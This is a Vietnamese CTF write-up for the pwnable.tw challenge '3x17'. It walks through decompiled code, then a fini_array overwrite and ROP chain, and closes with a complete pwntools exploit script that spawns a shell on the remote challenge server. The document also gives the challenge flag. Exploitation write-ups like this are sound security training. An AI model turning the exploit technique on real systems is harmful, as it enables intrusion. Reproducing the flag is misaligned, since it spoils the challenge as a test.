# 3x17 

[150 pts] 

![image](https://github.com/gookoosss/CTF/assets/128712571/d9642ebe-a757-4c75-8925-be42a12fedc0)

## ida 

```c 
// positive sp value has been detected, the output may be wrong!
void __fastcall __noreturn start(__int64 a1, __int64 a2, int a3)
{
  __int64 v3; // rax
  int v4; // esi
  __int64 v5; // [rsp-8h] [rbp-8h] BYREF
  void *retaddr; // [rsp+0h] [rbp+0h] BYREF

  v4 = v5;
  v5 = v3;
  sub_401EB0(
    (unsigned int)main,
    v4,
    (unsigned int)&retaddr,
    (unsigned int)sub_4028D0,
    (unsigned int)call_fini_array,
    a3,
    (__int64)&v5);
  __halt();
}
```

- hmm file bị tripped rồi, nên mk sẽ rename lại 1 số hàm quan trọng 

### main
```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char *v4; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  result = (unsigned __int8)++tmp;
  if ( tmp == 1 )
  {
    puts(1u, "addr:", 5uLL);
    read(0, buf, 24uLL);
    v4 = (char *)(int)sub_40EE70(buf);
    puts(1u, "data:", 5uLL);
    read(0, v4, 24uLL);
    result = 0;
  }
  if ( __readfsqword(0x28u) != v6 )
    note();
  return result;
}
```
- đơn giản là nhập địa chỉ sau đó nhập data vào địa chỉ đó
- hmm vậy ta có thể ow những địa chỉ quan trọng

### call_fini_array 

```c 
__int64 call_fini_array()
{
  signed __int64 v0; // rbx

  if ( (&unk_4B4100 - (_UNKNOWN *)fini_array) >> 3 )
  {
    v0 = ((&unk_4B4100 - (_UNKNOWN *)fini_array) >> 3) - 1;
    do
      fini_array[v0--]();
    while ( v0 != -1 );
  }
  return term_proc();
}
``` 

- gọi địa chỉ fini_array ra khi kết thúc chương trình 

## Analysis 

- thử kiểm tra các pop thì ta thấy có đầy đủ pop rdi, rax, rdx, rsi và syscall => ret2ROPchain 
- mỗi lần nhập chỉ tối đa 24byte, mà để set các arg cho syscall execve thì cần rất nhiều byte => cần phải nhập nhiều lần 
- ko có lỗi BOF nên muốn lặp lại hàm main chỉ có cách là ow fini_array thành địa chỉ hàm main => lặp vô tận
- sau khi set xong các arg thì ta sẽ kết thúc chương trình gadget leave; ret (bỏ qua hàm main)

## Exploit
- trước tiên cứ tìm các addr cần thiết đã 
```python 
main = 0x401b6d
fini_array = 0x00000000004b40f0
pop_rdi = 0x0000000000401696
pop_rax = 0x000000000041e4af
pop_rdx = 0x0000000000446e35 
pop_rsi = 0x0000000000406c30
syscall = 0x00000000004022b4
leave = 0x0000000000401c4b
call_fini_array = 0x402960
```
- ý tưởng của mình lúc này  

![image](https://github.com/gookoosss/CTF/assets/128712571/591b0b5d-e9f2-4f2b-a198-343446d3d891)


```python 
add(fini_array,  p64(main) + p64(0))
add(fini_array + 16, p64(pop_rdi) + p64(fini_array + 88))
add(fini_array + 32, p64(pop_rdx) + p64(0))
add(fini_array + 48, p64(pop_rsi) + p64(0))
add(fini_array + 64, p64(pop_rax) + p64(0x3b))
add(fini_array + 80, p64(syscall) + b'/bin/sh\0')
add(fini_array, p64(leave))
```

- sau khi set xong thì mk sẽ ow fini_array thành leave;ret để lấy shell
- nma có lỗi gì rồi mà mk ko lấy shell được
- tham khảo wu thì thấy phải thêm hàm call_fini_array vào đầu

### lý do 

![image](https://github.com/gookoosss/CTF/assets/128712571/141e346a-88d0-466c-ae9e-d2ff3fac7a04)


- mình sẽ sửa thành ntn 

```python 
add(fini_array, p64(call_fini_array) + p64(main))
add(fini_array + 16, p64(pop_rdi) + p64(fini_array + 88))
add(fini_array + 32, p64(pop_rdx) + p64(0))
add(fini_array + 48, p64(pop_rsi) + p64(0))
add(fini_array + 64, p64(pop_rax) + p64(0x3b))
add(fini_array + 80, p64(syscall) + b'/bin/sh\0')
add(fini_array, p64(leave))
``` 

- cuối cùng ta cũng lấy được shell 

![image](https://github.com/gookoosss/CTF/assets/128712571/1372c448-5958-4fc3-a61c-a2741c824f3a)


## script 

```python 
from pwn import *

# p = process('./3x17')
p = remote('chall.pwnable.tw', 10105)
exe = ELF('./3x17')

main = 0x401b6d
fini_array = 0x00000000004b40f0
pop_rdi = 0x0000000000401696
pop_rax = 0x000000000041e4af
pop_rdx = 0x0000000000446e35 
pop_rsi = 0x0000000000406c30
syscall = 0x00000000004022b4
leave = 0x0000000000401c4b
call_fini_array = 0x402960


def add(addr, data):
    p.sendafter(b'addr:', str(addr))
    p.sendafter(b'data:', data)

add(fini_array, p64(call_fini_array) + p64(main))
add(fini_array + 16, p64(pop_rdi) + p64(fini_array + 88))
add(fini_array + 32, p64(pop_rdx) + p64(0))
add(fini_array + 48, p64(pop_rsi) + p64(0))
add(fini_array + 64, p64(pop_rax) + p64(0x3b))
add(fini_array + 80, p64(syscall) + b'/bin/sh\0')
add(fini_array, p64(leave))

p.interactive()

# FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}
``` 

## Flag 

FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}

## refenrence 

https://hackmd.io/@trhoanglan04/ryoncvv42#3x17-150-pts
